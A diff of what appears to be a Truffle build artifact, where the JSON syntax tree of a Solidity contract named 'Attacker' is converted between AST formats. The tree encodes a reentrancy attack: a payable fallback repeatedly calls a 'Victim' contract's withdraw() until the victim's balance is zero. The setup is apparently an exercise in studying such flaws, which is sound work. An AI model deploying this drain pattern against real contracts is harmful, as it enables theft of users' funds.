-                      "typeIdentifier": "t_tuple$__$",
-                      "typeString": "tuple()"
-                    }
-                  },
-                  "id": 31,
-                  "nodeType": "ExpressionStatement",
-                  "src": "391:12:0"
-                }
-              ]
-            },
-            "documentation": null,
-            "id": 33,
-            "implemented": true,
-            "kind": "function",
-            "modifiers": [],
-            "name": "attack",
-            "nodeType": "FunctionDefinition",
-            "parameters": {
-              "id": 25,
-              "nodeType": "ParameterList",
-              "parameters": [],
-              "src": "371:2:0"
-            },
-            "returnParameters": {
-              "id": 26,
-              "nodeType": "ParameterList",
-              "parameters": [],
-              "src": "380:0:0"
-            },
-            "scope": 59,
-            "src": "356:55:0",
-            "stateMutability": "nonpayable",
-            "superFunction": null,
-            "visibility": "public"
-          },
-          {
-            "body": {
-              "id": 57,
-              "nodeType": "Block",
-              "src": "486:220:0",
-              "statements": [
-                {
-                  "eventCall": {
-                    "argumentTypes": null,
-                    "arguments": [
+                    "children": [
                       {
-                        "argumentTypes": null,
-                        "id": 37,
-                        "name": "count",
-                        "nodeType": "Identifier",
-                        "overloadedDeclarations": [],
-                        "referencedDeclaration": 6,
-                        "src": "542:5:0",
-                        "typeDescriptions": {
-                          "typeIdentifier": "t_uint256",
-                          "typeString": "uint256"
-                        }
-                      },
-                      {
-                        "argumentTypes": null,
-                        "expression": {
-                          "argumentTypes": null,
-                          "arguments": [
-                            {
-                              "argumentTypes": null,
-                              "id": 39,
-                              "name": "this",
-                              "nodeType": "Identifier",
-                              "overloadedDeclarations": [],
-                              "referencedDeclaration": 853,
-                              "src": "557:4:0",
-                              "typeDescriptions": {
-                                "typeIdentifier": "t_contract$_Attacker_$59",
-                                "typeString": "contract Attacker"
-                              }
-                            }
-                          ],
-                          "expression": {
-                            "argumentTypes": [
-                              {
-                                "typeIdentifier": "t_contract$_Attacker_$59",
-                                "typeString": "contract Attacker"
-                              }
-                            ],
-                            "id": 38,
-                            "isConstant": false,
-                            "isLValue": false,
-                            "isPure": true,
-                            "lValueRequested": false,
-                            "nodeType": "ElementaryTypeNameExpression",
-                            "src": "549:7:0",
-                            "typeDescriptions": {
-                              "typeIdentifier": "t_type$_t_address_$",
-                              "typeString": "type(address)"
-                            },
-                            "typeName": "address"
-                          },
-                          "id": 40,
-                          "isConstant": false,
-                          "isLValue": false,
-                          "isPure": false,
-                          "kind": "typeConversion",
-                          "lValueRequested": false,
-                          "names": [],
-                          "nodeType": "FunctionCall",
-                          "src": "549:13:0",
-                          "typeDescriptions": {
-                            "typeIdentifier": "t_address_payable",
-                            "typeString": "address payable"
-                          }
+                        "attributes": {
+                          "name": "address",
+                          "stateMutability": "nonpayable",
+                          "type": "address"
                         },
-                        "id": 41,
-                        "isConstant": false,
-                        "isLValue": false,
-                        "isPure": false,
-                        "lValueRequested": false,
-                        "memberName": "balance",
-                        "nodeType": "MemberAccess",
-                        "referencedDeclaration": null,
-                        "src": "549:21:0",
-                        "typeDescriptions": {
-                          "typeIdentifier": "t_uint256",
-                          "typeString": "uint256"
-                        }
+                        "id": 13,
+                        "name": "ElementaryTypeName",
+                        "src": "288:7:0"
                       }
                     ],
-                    "expression": {
-                      "argumentTypes": [
-                        {
-                          "typeIdentifier": "t_uint256",
-                          "typeString": "uint256"
-                        },
-                        {
-                          "typeIdentifier": "t_uint256",
-                          "typeString": "uint256"
-                        }
-                      ],
-                      "id": 36,
-                      "name": "LogFallback",
-                      "nodeType": "Identifier",
-                      "overloadedDeclarations": [],
-                      "referencedDeclaration": 12,
-                      "src": "530:11:0",
-                      "typeDescriptions": {
-                        "typeIdentifier": "t_function_event_nonpayable$_t_uint256_$_t_uint256_$returns$__$",
-                        "typeString": "function (uint256,uint256)"
-                      }
-                    },
-                    "id": 42,
-                    "isConstant": false,
-                    "isLValue": false,
-                    "isPure": false,
-                    "kind": "functionCall",
-                    "lValueRequested": false,
-                    "names": [],
-                    "nodeType": "FunctionCall",
-                    "src": "530:41:0",
-                    "typeDescriptions": {
-                      "typeIdentifier": "t_tuple$__$",
-                      "typeString": "tuple()"
-                    }
-                  },
-                  "id": 43,
-                  "nodeType": "EmitStatement",
-                  "src": "525:46:0"
+                    "id": 14,
+                    "name": "VariableDeclaration",
+                    "src": "288:14:0"
+                  }
+                ],
+                "id": 15,
+                "name": "ParameterList",
+                "src": "287:16:0"
+              },
+              {
+                "attributes": {
+                  "parameters": [
+                    null
+                  ]
                 },
-                {
-                  "condition": {
-                    "argumentTypes": null,
-                    "commonType": {
-                      "typeIdentifier": "t_uint256",
-                      "typeString": "uint256"
-                    },
-                    "id": 49,
-                    "isConstant": false,
-                    "isLValue": false,
-                    "isPure": false,
-                    "lValueRequested": false,
-                    "leftExpression": {
-                      "argumentTypes": null,
-                      "expression": {
-                        "argumentTypes": null,
-                        "arguments": [
-                          {
-                            "argumentTypes": null,
-                            "id": 45,
-                            "name": "v",
-                            "nodeType": "Identifier",
-                            "overloadedDeclarations": [],
-                            "referencedDeclaration": 4,
-                            "src": "643:1:0",
-                            "typeDescriptions": {
-                              "typeIdentifier": "t_contract$_Victim_$822",
-                              "typeString": "contract Victim"
-                            }
-                          }
-                        ],
-                        "expression": {
-                          "argumentTypes": [
-                            {
-                              "typeIdentifier": "t_contract$_Victim_$822",
-                              "typeString": "contract Victim"
-                            }
-                          ],
-                          "id": 44,
-                          "isConstant": false,
-                          "isLValue": false,
-                          "isPure": true,
-                          "lValueRequested": false,
-                          "nodeType": "ElementaryTypeNameExpression",
-                          "src": "635:7:0",
-                          "typeDescriptions": {
-                            "typeIdentifier": "t_type$_t_address_$",
-                            "typeString": "type(address)"
-                          },
-                          "typeName": "address"
-                        },
-                        "id": 46,
-                        "isConstant": false,
-                        "isLValue": false,
-                        "isPure": false,
-                        "kind": "typeConversion",
-                        "lValueRequested": false,
-                        "names": [],
-                        "nodeType": "FunctionCall",
-                        "src": "635:10:0",
-                        "typeDescriptions": {
-                          "typeIdentifier": "t_address",
-                          "typeString": "address"
-                        }
-                      },
-                      "id": 47,
-                      "isConstant": false,
-                      "isLValue": false,
-                      "isPure": false,
-                      "lValueRequested": false,
-                      "memberName": "balance",
-                      "nodeType": "MemberAccess",
-                      "referencedDeclaration": null,
-                      "src": "635:18:0",
-                      "typeDescriptions": {
-                        "typeIdentifier": "t_uint256",
-                        "typeString": "uint256"
-                      }
-                    },
-                    "nodeType": "BinaryOperation",
-                    "operator": "!=",
-                    "rightExpression": {
-                      "argumentTypes": null,
-                      "hexValue": "30",
-                      "id": 48,
-                      "isConstant": false,
-                      "isLValue": false,
-                      "isPure": true,
-                      "kind": "number",
-                      "lValueRequested": false,
-                      "nodeType": "Literal",
-                      "src": "657:1:0",
-                      "subdenomination": null,
-                      "typeDescriptions": {
-                        "typeIdentifier": "t_rational_0_by_1",
-                        "typeString": "int_const 0"
-                      },
-                      "value": "0"
-                    },
-                    "src": "635:23:0",
-                    "typeDescriptions": {
-                      "typeIdentifier": "t_bool",
-                      "typeString": "bool"
-                    }
-                  },
-                  "falseBody": null,
-                  "id": 56,
-                  "nodeType": "IfStatement",
-                  "src": "631:68:0",
-                  "trueBody": {
-                    "id": 55,
-                    "nodeType": "Block",
-                    "src": "660:39:0",
-                    "statements": [
+                "children": [],
+                "id": 16,
+                "name": "ParameterList",
+                "src": "311:0:0"
+              },
+              {
+                "children": [
+                  {
+                    "children": [
                       {
-                        "expression": {
+                        "attributes": {
                           "argumentTypes": null,
-                          "arguments": [],
-                          "expression": {
-                            "argumentTypes": [],
-                            "expression": {
-                              "argumentTypes": null,
-                              "id": 50,
-                              "name": "v",
-                              "nodeType": "Identifier",
-                              "overloadedDeclarations": [],
-                              "referencedDeclaration": 4,
-                              "src": "675:1:0",
-                              "typeDescriptions": {
-                                "typeIdentifier": "t_contract$_Victim_$822",
-                                "typeString": "contract Victim"
-                              }
-                            },
-                            "id": 52,
-                            "isConstant": false,
-                            "isLValue": false,
-                            "isPure": false,
-                            "lValueRequested": false,
-                            "memberName": "withdraw",
-                            "nodeType": "MemberAccess",
-                            "referencedDeclaration": 458,
-                            "src": "675:10:0",
-                            "typeDescriptions": {
-                              "typeIdentifier": "t_function_external_nonpayable$__$returns$__$",
-                              "typeString": "function () external"
-                            }
-                          },
-                          "id": 53,
                           "isConstant": false,
                           "isLValue": false,
                           "isPure": false,
-                          "kind": "functionCall",
                           "lValueRequested": false,
-                          "names": [],
-                          "nodeType": "FunctionCall",
-                          "src": "675:12:0",
-                          "typeDescriptions": {
-                            "typeIdentifier": "t_tuple$__$",
-                            "typeString": "tuple()"
-                          }
+                          "operator": "=",
+                          "type": "contract Victim"
                         },
-                        "id": 54,
-                        "nodeType": "ExpressionStatement",
-                        "src": "675:12:0"
+                        "children": [
+                          {
+                            "attributes": {
+                              "argumentTypes": null,
+                              "overloadedDeclarations": [
+                                null
+                              ],
+                              "referencedDeclaration": 4,
+                              "type": "contract Victim",
+                              "value": "v"
+                            },
+                            "id": 17,
+                            "name": "Identifier",
+                            "src": "322:1:0"
+                          },
+                          {
+                            "attributes": {
+                              "argumentTypes": null,
+                              "isConstant": false,
+                              "isLValue": false,
+                              "isPure": false,
+                              "isStructConstructorCall": false,
+                              "lValueRequested": false,
+                              "names": [
+                                null
+                              ],
+                              "type": "contract Victim",
+                              "type_conversion": true
+                            },
+                            "children": [
+                              {
+                                "attributes": {
+                                  "argumentTypes": [
+                                    {
+                                      "typeIdentifier": "t_address",
+                                      "typeString": "address"
+                                    }
+                                  ],
+                                  "overloadedDeclarations": [
+                                    null
+                                  ],
+                                  "referencedDeclaration": 1212,
+                                  "type": "type(contract Victim)",
+                                  "value": "Victim"
+                                },
+                                "id": 18,
+                                "name": "Identifier",
+                                "src": "326:6:0"
+                              },
+                              {
+                                "attributes": {
+                                  "argumentTypes": null,
+                                  "overloadedDeclarations": [
+                                    null
+                                  ],
+                                  "referencedDeclaration": 14,
+                                  "type": "address",
+                                  "value": "victim"
+                                },
+                                "id": 19,
+                                "name": "Identifier",
+                                "src": "333:6:0"
+                              }
+                            ],
+                            "id": 20,
+                            "name": "FunctionCall",
+                            "src": "326:14:0"
+                          }
+                        ],
+                        "id": 21,
+                        "name": "Assignment",
+                        "src": "322:18:0"
                       }
-                    ]
+                    ],
+                    "id": 22,
+                    "name": "ExpressionStatement",
+                    "src": "322:18:0"
                   }
-                }
-              ]
+                ],
+                "id": 23,
+                "name": "Block",
+                "src": "311:37:0"
+              }
+            ],
+            "id": 24,
+            "name": "FunctionDefinition",
+            "src": "276:72:0"
+          },
+          {
+            "attributes": {
+              "documentation": null,
+              "implemented": true,
+              "isConstructor": false,
+              "kind": "function",
+              "modifiers": [
+                null
+              ],
+              "name": "attack",
+              "scope": 59,
+              "stateMutability": "nonpayable",
+              "superFunction": null,
+              "visibility": "public"
             },
-            "documentation": null,
+            "children": [
+              {
+                "attributes": {
+                  "parameters": [
+                    null
+                  ]
+                },
+                "children": [],
+                "id": 25,
+                "name": "ParameterList",
+                "src": "371:2:0"
+              },
+              {
+                "attributes": {
+                  "parameters": [
+                    null
+                  ]
+                },
+                "children": [],
+                "id": 26,
+                "name": "ParameterList",
+                "src": "380:0:0"
+              },
+              {
+                "children": [
+                  {
+                    "children": [
+                      {
+                        "attributes": {
+                          "argumentTypes": null,
+                          "arguments": [
+                            null
+                          ],
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "isStructConstructorCall": false,
+                          "lValueRequested": false,
+                          "names": [
+                            null
+                          ],
+                          "type": "tuple()",
+                          "type_conversion": false
+                        },
+                        "children": [
+                          {
+                            "attributes": {
+                              "argumentTypes": [
+                                null
+                              ],
+                              "isConstant": false,
+                              "isLValue": false,
+                              "isPure": false,
+                              "lValueRequested": false,
+                              "member_name": "withdraw",
+                              "referencedDeclaration": 784,
+                              "type": "function () external"
+                            },
+                            "children": [
+                              {
+                                "attributes": {
+                                  "argumentTypes": null,
+                                  "overloadedDeclarations": [
+                                    null
+                                  ],
+                                  "referencedDeclaration": 4,
+                                  "type": "contract Victim",
+                                  "value": "v"
+                                },
+                                "id": 27,
+                                "name": "Identifier",
+                                "src": "391:1:0"
+                              }
+                            ],
+                            "id": 29,
+                            "name": "MemberAccess",
+                            "src": "391:10:0"
+                          }
+                        ],
+                        "id": 30,
+                        "name": "FunctionCall",
+                        "src": "391:12:0"
+                      }
+                    ],
+                    "id": 31,
+                    "name": "ExpressionStatement",
+                    "src": "391:12:0"
+                  }
+                ],
+                "id": 32,
+                "name": "Block",
+                "src": "380:31:0"
+              }
+            ],
+            "id": 33,
+            "name": "FunctionDefinition",
+            "src": "356:55:0"
+          },
+          {
+            "attributes": {
+              "documentation": null,
+              "implemented": true,
+              "isConstructor": false,
+              "kind": "fallback",
+              "modifiers": [
+                null
+              ],
+              "name": "",
+              "scope": 59,
+              "stateMutability": "payable",
+              "superFunction": null,
+              "visibility": "external"
+            },
+            "children": [
+              {
+                "attributes": {
+                  "parameters": [
+                    null
+                  ]
+                },
+                "children": [],
+                "id": 34,
+                "name": "ParameterList",
+                "src": "466:2:0"
+              },
+              {
+                "attributes": {
+                  "parameters": [
+                    null
+                  ]
+                },
+                "children": [],
+                "id": 35,
+                "name": "ParameterList",
+                "src": "486:0:0"
+              },
+              {
+                "children": [
+                  {
+                    "children": [
+                      {
+                        "attributes": {
+                          "argumentTypes": null,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "isStructConstructorCall": false,
+                          "lValueRequested": false,
+                          "names": [
+                            null
+                          ],
+                          "type": "tuple()",
+                          "type_conversion": false
+                        },
+                        "children": [
+                          {
+                            "attributes": {
+                              "argumentTypes": [
+                                {
+                                  "typeIdentifier": "t_uint256",
+                                  "typeString": "uint256"
+                                },
+                                {
+                                  "typeIdentifier": "t_uint256",
+                                  "typeString": "uint256"
+                                }
+                              ],
+                              "overloadedDeclarations": [
+                                null
+                              ],
+                              "referencedDeclaration": 12,
+                              "type": "function (uint256,uint256)",
+                              "value": "LogFallback"
+                            },
+                            "id": 36,
+                            "name": "Identifier",
+                            "src": "530:11:0"
+                          },
+                          {
+                            "attributes": {
+                              "argumentTypes": null,
+                              "overloadedDeclarations": [
+                                null
+                              ],
+                              "referencedDeclaration": 6,
+                              "type": "uint256",
+                              "value": "count"
+                            },
+                            "id": 37,
+                            "name": "Identifier",
+                            "src": "542:5:0"
+                          },
+                          {
+                            "attributes": {
+                              "argumentTypes": null,
+                              "isConstant": false,
+                              "isLValue": false,
+                              "isPure": false,
+                              "lValueRequested": false,
+                              "member_name": "balance",
+                              "referencedDeclaration": null,
+                              "type": "uint256"
+                            },
+                            "children": [
+                              {
+                                "attributes": {
+                                  "argumentTypes": null,
+                                  "isConstant": false,
+                                  "isLValue": false,
+                                  "isPure": false,
+                                  "isStructConstructorCall": false,
+                                  "lValueRequested": false,
+                                  "names": [
+                                    null
+                                  ],
+                                  "type": "address payable",
+                                  "type_conversion": true
+                                },
+                                "children": [
+                                  {
+                                    "attributes": {
+                                      "argumentTypes": [
+                                        {
+                                          "typeIdentifier": "t_contract$_Attacker_$59",
+                                          "typeString": "contract Attacker"
+                                        }
+                                      ],
+                                      "isConstant": false,
+                                      "isLValue": false,
+                                      "isPure": true,
+                                      "lValueRequested": false,
+                                      "type": "type(address)",
+                                      "value": "address"
+                                    },
+                                    "id": 38,
+                                    "name": "ElementaryTypeNameExpression",
+                                    "src": "549:7:0"
+                                  },
+                                  {
+                                    "attributes": {
+                                      "argumentTypes": null,
+                                      "overloadedDeclarations": [
+                                        null
+                                      ],
+                                      "referencedDeclaration": 1243,
+                                      "type": "contract Attacker",
+                                      "value": "this"
+                                    },
+                                    "id": 39,
+                                    "name": "Identifier",
+                                    "src": "557:4:0"
+                                  }
+                                ],
+                                "id": 40,
+                                "name": "FunctionCall",
+                                "src": "549:13:0"
+                              }
+                            ],
+                            "id": 41,
+                            "name": "MemberAccess",
+                            "src": "549:21:0"
+                          }
+                        ],
+                        "id": 42,
+                        "name": "FunctionCall",
+                        "src": "530:41:0"
+                      }
+                    ],
+                    "id": 43,
+                    "name": "EmitStatement",
+                    "src": "525:46:0"
+                  },
+                  {
+                    "attributes": {
+                      "falseBody": null
+                    },
+                    "children": [
+                      {
+                        "attributes": {
+                          "argumentTypes": null,
+                          "commonType": {
+                            "typeIdentifier": "t_uint256",
+                            "typeString": "uint256"
+                          },
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "lValueRequested": false,
+                          "operator": "!=",
+                          "type": "bool"
+                        },
+                        "children": [
+                          {
+                            "attributes": {
+                              "argumentTypes": null,
+                              "isConstant": false,
+                              "isLValue": false,
+                              "isPure": false,
+                              "lValueRequested": false,
+                              "member_name": "balance",
+                              "referencedDeclaration": null,
+                              "type": "uint256"
+                            },
+                            "children": [
+                              {
+                                "attributes": {
+                                  "argumentTypes": null,
+                                  "isConstant": false,
+                                  "isLValue": false,
+                                  "isPure": false,
+                                  "isStructConstructorCall": false,
+                                  "lValueRequested": false,
+                                  "names": [
+                                    null
+                                  ],
+                                  "type": "address",
+                                  "type_conversion": true
+                                },
+                                "children": [
+                                  {
+                                    "attributes": {
+                                      "argumentTypes": [
+                                        {
+                                          "typeIdentifier": "t_contract$_Victim_$1212",
+                                          "typeString": "contract Victim"
+                                        }
+                                      ],
+                                      "isConstant": false,
+                                      "isLValue": false,
+                                      "isPure": true,
+                                      "lValueRequested": false,
+                                      "type": "type(address)",
+                                      "value": "address"
+                                    },
+                                    "id": 44,
+                                    "name": "ElementaryTypeNameExpression",
+                                    "src": "635:7:0"
+                                  },
+                                  {
+                                    "attributes": {
+                                      "argumentTypes": null,
+                                      "overloadedDeclarations": [
+                                        null
+                                      ],
+                                      "referencedDeclaration": 4,
+                                      "type": "contract Victim",
+                                      "value": "v"
+                                    },
+                                    "id": 45,
+                                    "name": "Identifier",
+                                    "src": "643:1:0"
+                                  }
+                                ],
+                                "id": 46,
+                                "name": "FunctionCall",
+                                "src": "635:10:0"
+                              }
+                            ],
+                            "id": 47,
+                            "name": "MemberAccess",
+                            "src": "635:18:0"
+                          },
+                          {
+                            "attributes": {
+                              "argumentTypes": null,
+                              "hexvalue": "30",
+                              "isConstant": false,
+                              "isLValue": false,
+                              "isPure": true,
+                              "lValueRequested": false,
+                              "subdenomination": null,
+                              "token": "number",
+                              "type": "int_const 0",
+                              "value": "0"
+                            },
+                            "id": 48,
+                            "name": "Literal",
+                            "src": "657:1:0"
+                          }
+                        ],
+                        "id": 49,
+                        "name": "BinaryOperation",
+                        "src": "635:23:0"
+                      },
+                      {
+                        "children": [
+                          {
+                            "children": [
+                              {
+                                "attributes": {
+                                  "argumentTypes": null,
+                                  "arguments": [
+                                    null
+                                  ],
+                                  "isConstant": false,
+                                  "isLValue": false,
+                                  "isPure": false,
+                                  "isStructConstructorCall": false,
+                                  "lValueRequested": false,
+                                  "names": [
+                                    null
+                                  ],
+                                  "type": "tuple()",
+                                  "type_conversion": false
+                                },
+                                "children": [
+                                  {
+                                    "attributes": {
+                                      "argumentTypes": [
+                                        null
+                                      ],
+                                      "isConstant": false,
+                                      "isLValue": false,
+                                      "isPure": false,
+                                      "lValueRequested": false,
+                                      "member_name": "withdraw",
+                                      "referencedDeclaration": 784,
+                                      "type": "function () external"
+                                    },
+                                    "children": [
+                                      {
+                                        "attributes": {
+                                          "argumentTypes": null,
+                                          "overloadedDeclarations": [
+                                            null
+                                          ],
+                                          "referencedDeclaration": 4,
+                                          "type": "contract Victim",
+                                          "value": "v"
+                                        },
+                                        "id": 50,
+                                        "name": "Identifier",
+                                        "src": "675:1:0"
+                                      }
+                                    ],
+                                    "id": 52,
+                                    "name": "MemberAccess",
+                                    "src": "675:10:0"
+                                  }
+                                ],
+                                "id": 53,
+                                "name": "FunctionCall",
+                                "src": "675:12:0"
+                              }
+                            ],
+                            "id": 54,
+                            "name": "ExpressionStatement",
+                            "src": "675:12:0"
+                          }
+                        ],
+                        "id": 55,
+                        "name": "Block",
+                        "src": "660:39:0"
+                      }
+                    ],
+                    "id": 56,
+                    "name": "IfStatement",
+                    "src": "631:68:0"
+                  }
+                ],
+                "id": 57,
+                "name": "Block",
+                "src": "486:220:0"
+              }
+            ],
             "id": 58,
-            "implemented": true,
-            "kind": "fallback",
-            "modifiers": [],
-            "name": "",
-            "nodeType": "FunctionDefinition",
-            "parameters": {
-              "id": 34,
-              "nodeType": "ParameterList",
-              "parameters": [],
-              "src": "466:2:0"
-            },
-            "returnParameters": {
-              "id": 35,
-              "nodeType": "ParameterList",
-              "parameters": [],
-              "src": "486:0:0"
-            },
-            "scope": 59,
-            "src": "457:249:0",
-            "stateMutability": "payable",
-            "superFunction": null,
-            "visibility": "external"
+            "name": "FunctionDefinition",
+            "src": "457:249:0"
           }
         ],
-        "scope": 60,
+        "id": 59,
+        "name": "ContractDefinition",
         "src": "84:625:0"
       }
     ],
+    "id": 60,
+    "name": "SourceUnit",
     "src": "0:709:0"
   },
   "compiler": {
@@ -1530,8 +1642,8 @@
     "version": "0.5.16+commit.9c3226ce.Emscripten.clang"
   },
   "networks": {},
-  "schemaVersion": "3.2.3",
-  "updatedAt": "2020-10-19T14:44:47.446Z",
+  "schemaVersion": "3.3.3",
+  "updatedAt": "2021-03-29T13:13:49.675Z",
   "devdoc": {
     "methods": {}
   },
